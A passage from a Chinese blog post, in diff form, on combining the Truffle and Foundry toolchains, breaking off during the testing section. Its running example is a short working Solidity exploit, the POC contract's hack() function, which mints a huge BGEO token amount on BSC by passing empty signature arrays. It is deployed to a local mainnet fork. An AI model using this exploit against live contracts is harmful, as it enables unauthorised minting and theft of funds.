@@ -1,0 +1,956 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <title>在一个项目中同时使用Truffle和Foundry - YINHUI&#39;s BLOG</title><meta name="Description" content="银辉的博客"><meta property="og:title" content="在一个项目中同时使用Truffle和Foundry" />
+<meta property="og:description" content="foundry套件有很棒的功能，比如一堆作弊码可以快速验证自己的想法，可以给地址打标签以及trace。truffle可以向GDB一样debu" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://yinhui1984.github.io/truffle_foundry_together/" /><meta property="og:image" content="https://yinhui1984.github.io/avatar.png"/><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2023-06-09T13:35:50+08:00" />
+<meta property="article:modified_time" content="2023-06-09T13:35:50+08:00" /><meta property="og:site_name" content="YINHUI&#39;s BLOG" />
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="https://yinhui1984.github.io/avatar.png"/>
+
+<meta name="twitter:title" content="在一个项目中同时使用Truffle和Foundry"/>
+<meta name="twitter:description" content="foundry套件有很棒的功能，比如一堆作弊码可以快速验证自己的想法，可以给地址打标签以及trace。truffle可以向GDB一样debu"/>
+<meta name="application-name" content="YINHUI&#39;s BLOG">
+<meta name="apple-mobile-web-app-title" content="YINHUI&#39;s BLOG"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://yinhui1984.github.io/truffle_foundry_together/" /><link rel="prev" href="https://yinhui1984.github.io/binance-bgeo-attack-analysis/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "在一个项目中同时使用Truffle和Foundry",
+        "inLanguage": "zh-CN",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "https:\/\/yinhui1984.github.io\/truffle_foundry_together\/"
+        },"genre": "posts","keywords": "L3, Web3.0","wordcount":  2204 ,
+        "url": "https:\/\/yinhui1984.github.io\/truffle_foundry_together\/","datePublished": "2023-06-09T13:35:50+08:00","dateModified": "2023-06-09T13:35:50+08:00","publisher": {
+            "@type": "Organization",
+            "name": ""},"author": {
+                "@type": "Person",
+                "name": "yinhui"
+            },"description": ""
+    }
+    </script></head>
+    <body data-header-desktop="fixed" data-header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('auto' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'auto' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="YINHUI&#39;s BLOG"></a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/"> 文章 </a><a class="menu-item" href="/tags/"> 标签 </a><a class="menu-item" href="/categories/"> 分类 </a><a class="menu-item" href="/"> 首页 </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Search">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Clear">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                    <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+                </a>
+            </div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="YINHUI&#39;s BLOG"></a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Search">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Clear">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        Cancel
+                    </a>
+                </div><a class="menu-item" href="/posts/" title="">文章</a><a class="menu-item" href="/tags/" title="">标签</a><a class="menu-item" href="/categories/" title="">分类</a><a class="menu-item" href="/" title="">首页</a><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+            </a></div>
+    </div>
+</header><div class="search-dropdown desktop">
+        <div id="search-dropdown-desktop"></div>
+    </div>
+    <div class="search-dropdown mobile">
+        <div id="search-dropdown-mobile"></div>
+    </div><main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">Contents</h2>
+            <div class="toc-content always-active" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">在一个项目中同时使用Truffle和Foundry</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="https://github.com/yinhui1984" title="Author" target="_blank" rel="noopener noreffer author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>yinhui</a></span>&nbsp;<span class="post-category">included in <a href="/categories/blockchain/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>Blockchain</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2023-06-09">2023-06-09</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;2204 words&nbsp;
+                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;5 minutes&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  data-kept="">
+                <div class="details-summary toc-title">
+                    <span>Contents</span>
+                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#创建项目">创建项目</a></li>
+    <li><a href="#编写合约">编写合约</a>
+      <ul>
+        <li><a href="#新建合约文件">新建合约文件</a></li>
+        <li><a href="#关于依赖的库">关于依赖的库</a></li>
+      </ul>
+    </li>
+    <li><a href="#部署合约">部署合约</a>
+      <ul>
+        <li><a href="#关于节点">关于节点</a></li>
+        <li><a href="#连接到节点">连接到节点</a></li>
+      </ul>
+    </li>
+    <li><a href="#部署">部署</a></li>
+    <li><a href="#测试">测试</a>
+      <ul>
+        <li><a href="#forge-test">forge test</a></li>
+        <li><a href="#truffle-test">truffle test</a></li>
+      </ul>
+    </li>
+    <li><a href="#调试">调试</a>
+      <ul>
+        <li><a href="#调试tx">调试tx</a></li>
+        <li><a href="#在test-case中加入调试">在test case中加入调试</a></li>
+        <li><a href="#调试合约的只读方法">调试合约的只读方法</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><p>foundry套件有很棒的功能，比如一堆作弊码可以快速验证自己的想法，可以给地址打标签以及trace。truffle可以向GDB一样debug源代码的功能又太爽了，所有想把两者融合在同一个项目中。</p>
+<p>以编写<a href="https://yinhui1984.github.io/binance-bgeo-attack-analysis/" target="_blank" rel="noopener noreffer ">这个POC</a>为例</p>
+<h2 id="创建项目">创建项目</h2>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">mkdir BGEO_DEMO
+</span></span><span class="line"><span class="cl"><span class="nb">cd</span> BGEO_DEMO
+</span></span><span class="line"><span class="cl">truffle init  --force
+</span></span><span class="line"><span class="cl">forge init --force   
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>关于项目文件夹， 由于 foundry套件中的命令很多都可以指定文件夹或文件路径，所以我们将<code>test</code>文件夹留给truffle, foundry的测试程序放到另外的文件夹中，比如<code>test_forge</code>  。 合约源代码都放到truffle创建的<code>contracts</code>文件夹中</p>
+<h2 id="编写合约">编写合约</h2>
+<h3 id="新建合约文件">新建合约文件</h3>
+<p>如上所述， 合约源代码都放到truffle创建的<code>contracts</code>文件夹中。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">truffle create contract POC
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>或手动创建</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">touch ./contracts/POC.sol
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="关于依赖的库">关于依赖的库</h3>
+<p>比如我们依赖 openzeppein, 为了同时让truffle 和forge都能编译通过，我们采用<code>forge install</code>的形式来安装依赖库，然后在源代码中直接使用相对路径</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="line"><span class="cl"><span class="c1">// SPDX-License-Identifier: MIT
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">pragma solidity</span> <span class="o">^</span><span class="mi">0</span><span class="p">.</span><span class="mi">8</span><span class="p">.</span><span class="mi">10</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">// 使用 forge install OpenZeppelin/openzeppelin-contracts --no-commit
+</span></span></span><span class="line"><span class="cl"><span class="c1">// 然后使用相对路径
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kn">import</span> <span class="s">&#34;../lib/openzeppelin-contracts/contracts/access/Ownable.sol&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kd">interface</span> <span class="nc">IBGEO20</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">balanceOf</span><span class="p">(</span><span class="kt">address</span> <span class="n">account</span><span class="p">)</span> <span class="k">external</span> <span class="k">view</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">uint256</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">decimals</span><span class="p">()</span> <span class="k">external</span> <span class="k">view</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">uint8</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">mint</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">        <span class="kt">uint256</span> <span class="n">_amount</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="kt">string</span> <span class="k">memory</span> <span class="n">_txHash</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="kt">address</span> <span class="n">_receiver</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="kt">bytes32</span><span class="p">[]</span> <span class="k">memory</span> <span class="n">_r</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="kt">bytes32</span><span class="p">[]</span> <span class="k">memory</span> <span class="n">_s</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="kt">uint8</span><span class="p">[]</span> <span class="k">memory</span> <span class="n">_v</span>
+</span></span><span class="line"><span class="cl">    <span class="p">)</span> <span class="k">external</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">bool</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="c1">// this contract is on BSC chain
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="n">IBGEO20</span> <span class="k">constant</span> <span class="n">BGEO</span> <span class="o">=</span> <span class="n">IBGEO20</span><span class="p">(</span><span class="mh">0xc342774492b54ce5F8ac662113ED702Fc1b34972</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kd">contract</span> <span class="nc">POC</span> <span class="k">is</span> <span class="n">Ownable</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">randString</span><span class="p">()</span> <span class="k">private</span> <span class="k">view</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">string</span> <span class="k">memory</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="kt">bytes32</span> <span class="n">rand</span> <span class="o">=</span> <span class="nb">keccak256</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">            <span class="nb">abi</span><span class="p">.</span><span class="nb">encodePacked</span><span class="p">(</span><span class="nb">block</span><span class="p">.</span><span class="nb">timestamp</span><span class="p">,</span> <span class="nb">block</span><span class="p">.</span><span class="nb">difficulty</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="kt">string</span><span class="p">(</span><span class="nb">abi</span><span class="p">.</span><span class="nb">encodePacked</span><span class="p">(</span><span class="n">rand</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">hack</span><span class="p">()</span> <span class="k">public</span> <span class="n">onlyOwner</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">uint256</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">BGEO</span><span class="p">.</span><span class="n">mint</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">            <span class="mi">99999999999999999</span> <span class="o">*</span> <span class="mi">10</span> <span class="o">**</span> <span class="mi">18</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">            <span class="n">randString</span><span class="p">(),</span> <span class="c1">// use rand string, or else may revert by &#34;tx-hash-used&#34; in _mint() function
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="kt">address</span><span class="p">(</span><span class="nb">this</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl">            <span class="k">new</span> <span class="kt">bytes32</span><span class="p">[](</span><span class="mi">0</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl">            <span class="k">new</span> <span class="kt">bytes32</span><span class="p">[](</span><span class="mi">0</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl">            <span class="k">new</span> <span class="kt">uint8</span><span class="p">[](</span><span class="mi">0</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="kt">uint256</span> <span class="nb">balance</span> <span class="o">=</span> <span class="n">BGEO</span><span class="p">.</span><span class="n">balanceOf</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="nb">this</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="c1">//require(balance == 0, &#34;just for test&#34;);
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="k">return</span> <span class="nb">balance</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>可以看到truffle 和 forge都编译通过了</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">~/Dow/BGEO_DEMO main +2 !5 <span class="m">6</span> ❯ forge build              
+</span></span><span class="line"><span class="cl"><span class="o">[</span>⠢<span class="o">]</span> Compiling...
+</span></span><span class="line"><span class="cl"><span class="o">[</span>⠒<span class="o">]</span> Compiling <span class="m">13</span> files with 0.8.17
+</span></span><span class="line"><span class="cl"><span class="o">[</span>⠰<span class="o">]</span> Solc 0.8.17 finished in 2.90s
+</span></span><span class="line"><span class="cl">Compiler run successful!
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">~/Dow/BGEO_DEMO main +2 !5 <span class="m">6</span> ❯ truffle compile      
+</span></span><span class="line"><span class="cl">Compiling your contracts...
+</span></span><span class="line"><span class="cl"><span class="o">===========================</span>
+</span></span><span class="line"><span class="cl">&gt; Compiling ./contracts/POC.sol
+</span></span><span class="line"><span class="cl">&gt; Compiling ./lib/openzeppelin-contracts/contracts/access/Ownable.sol
+</span></span><span class="line"><span class="cl">&gt; Compiling ./lib/openzeppelin-contracts/contracts/utils/Context.sol
+</span></span><span class="line"><span class="cl">&gt; Artifacts written to /Users/zhouyinhui/Downloads/BGEO_DEMO/build/contracts
+</span></span><span class="line"><span class="cl">&gt; Compiled successfully using:
+</span></span><span class="line"><span class="cl">   - solc: 0.8.10+commit.fc410830.Emscripten.clang
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="部署合约">部署合约</h2>
+<h3 id="关于节点">关于节点</h3>
+<p>需要考虑测试节点能同时满足truffle和forge, 经过尝试，最好的办法是使用ganache (CLI版本)分叉主网。</p>
+<p>注：不要使用foundry 自带的anvil, 其在truffle测试时不能提供源代码信息</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">ganache --fork.url https://rpc.ankr.com/bsc/&lt;YOUR_API_KEY&gt; --fork.blockNumber 22315679
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="连接到节点">连接到节点</h3>
+<p>truffle: 在truffle-config.js的networks中配置</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">    development: {
+</span></span><span class="line"><span class="cl">      host: &#34;127.0.0.1&#34;,     // Localhost (default: none)
+</span></span><span class="line"><span class="cl">      port: 8545,            // Standard Ethereum port (default: none)
+</span></span><span class="line"><span class="cl">      network_id: &#34;*&#34;,       // Any network (default: none)
+</span></span><span class="line"><span class="cl">    },
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>foundry： 在foundry.toml中配置</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">eth-rpc-url = &#34;http://localhost:8545&#34;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="部署">部署</h2>
+<p>只使用truffle进行部署就可以了，因为truffle和foundry共用一个节点</p>
+<p>创建部署文件：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">truffle create migration POC
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>部署代码：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">var POC = artifacts.require(&#34;POC&#34;);
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">module.exports = function (_deployer) {
+</span></span><span class="line"><span class="cl">  // Use deployer to state migration tasks.
+</span></span><span class="line"><span class="cl">  _deployer.deploy(POC);
+</span></span><span class="line"><span class="cl">};
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>部署：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">truffle migrate --reset
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>输出：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">~/Dow/BGEO_DEMO main +2 !5 6 ❯ make deploy                anaconda3  18.12.1 ⮂ 127.0.0.1:7890
+</span></span><span class="line"><span class="cl">truffle migrate --reset 
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Compiling your contracts...
+</span></span><span class="line"><span class="cl">===========================
+</span></span><span class="line"><span class="cl">&gt; Everything is up to date, there is nothing to compile.
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Starting migrations...
+</span></span><span class="line"><span class="cl">======================
+</span></span><span class="line"><span class="cl">&gt; Network name:    &#39;development&#39;
+</span></span><span class="line"><span class="cl">&gt; Network id:      56
+</span></span><span class="line"><span class="cl">&gt; Block gas limit: 30000000 (0x1c9c380)
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">1686278999_p_o_c.js
+</span></span><span class="line"><span class="cl">===================
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">   Replacing &#39;POC&#39;
+</span></span><span class="line"><span class="cl">   ---------------
+</span></span><span class="line"><span class="cl">   &gt; transaction hash:    0x414c623dde6551e2bf8c0ffa8f2d8f040137bedfac97585f9e4a6d9b73238e1c
+</span></span><span class="line"><span class="cl">   &gt; Blocks: 0            Seconds: 0
+</span></span><span class="line"><span class="cl">   &gt; contract address:    0xEc805CA1AF9C55965EfFcDCd69cb3C2429663A99
+</span></span><span class="line"><span class="cl">   &gt; block number:        22315699
+</span></span><span class="line"><span class="cl">   &gt; block timestamp:     1686292948
+</span></span><span class="line"><span class="cl">   &gt; account:             0x712517A5895fCD531E77A98F67b4517ED86BaA4a
+</span></span><span class="line"><span class="cl">   &gt; balance:             999.975114113706586465
+</span></span><span class="line"><span class="cl">   &gt; gas used:            730768 (0xb2690)
+</span></span><span class="line"><span class="cl">   &gt; gas price:           2.585480836 gwei
+</span></span><span class="line"><span class="cl">   &gt; value sent:          0 ETH
+</span></span><span class="line"><span class="cl">   &gt; total cost:          0.001889386659562048 ETH
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">   &gt; Saving artifacts
+</span></span><span class="line"><span class="cl">   -------------------------------------
+</span></span><span class="line"><span class="cl">   &gt; Total cost:     0.001889386659562048 ETH
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Summary
+</span></span><span class="line"><span class="cl">=======
+</span></span><span class="line"><span class="cl">&gt; Total deployments:   1
+</span></span><span class="line"><span class="cl">&gt; Final cost:          0.001889386659562048 ETH
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="测试">测试</h2>
+<h3 id="forge-test">forge test</h3>
+<p>forge的测试程序需要新建一个文件夹，而不是将其放在默认的test文件夹中，否则truffle会把forge的测试程序认为是自己的</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">mkdir test_forge
+</span></span><span class="line"><span class="cl">touch test_forge/poc.t.sol
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span></code></pre></td>
+<td class="lntd">
